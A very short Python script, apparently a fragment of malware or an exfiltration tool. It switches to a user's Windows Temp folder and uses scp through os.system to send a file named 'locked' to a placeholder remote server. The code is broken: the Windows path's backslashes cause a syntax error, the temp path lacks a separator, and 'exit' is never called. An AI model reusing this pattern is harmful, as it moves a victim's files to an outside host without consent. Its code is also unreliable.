import os 

os.chdir("C:\Users\Monk\AppData\Local\Temp")
nm = "locked"
os.system("scp %temp%"+nm+" <username>@<Server Ip>:<Location>")
exit